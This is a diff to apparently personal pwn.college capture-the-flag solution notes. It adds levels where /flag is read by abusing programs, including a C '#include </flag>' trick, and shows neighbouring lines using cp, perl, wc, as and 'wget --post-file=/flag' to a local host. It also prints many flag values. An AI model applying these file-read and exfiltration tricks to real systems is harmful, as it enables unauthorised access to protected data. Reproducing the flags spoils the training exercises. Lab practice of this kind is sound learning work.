@@ -182,6 +182,12 @@ pwn.college{IySyvfWd40QDmx-ZDySpfKpfliG.0FM4EDLwIzW}
 /bin/cp /flag /tmp/flag --no-preserve=mode
 pwn.college{cZqwJ2_7WV58QAM_3yykrJRzgGn.0VM4EDLwIzW}
 
+## Level40
+Move /flag to ~
+Go to level1 and cat it out lol
+cat flag
+pwn.college{Ajxxa9ESah3PnpIqF60-JTdGkoB.0lM4EDLwIzW}
+
 ## Level41
 perl -ne'1..10 and print' /flag
 pwn.college{M2HBzqkjxCRramBMkKgxH2UClQB.01M4EDLwIzW}
@@ -206,6 +212,14 @@ pwn.college{0NiDqcgyIOxxyVuqsUevoUWPWku.0VN4EDLwIzW}
 /bin/wc --files0-from=/flag
 /bin/wc: 'pwn.college{kAUFJ5r8QwTJLV_jjx7UiBCaF5W.0VO4EDLwIzW}'$'\n': No such file or directory
 
+## Level48
+script.c
+```
+#include </flag>
+puts("test")
+```
+pwn.college{oWB03W7h7ceSPZJ89_8GUaGxMxz.0FM5EDLwIzW}
+
 ## Level49
 as /flag
 /flag: Assembler messages:
@@ -219,6 +233,7 @@ pwn.college{cYHRC-_11AQF8K4QK218hmJ4u9X.0lM5EDLwIzW}
 Term2:
 /bin/wget --post-file=/flag http://localhost
 
+## Lev
 
 
 
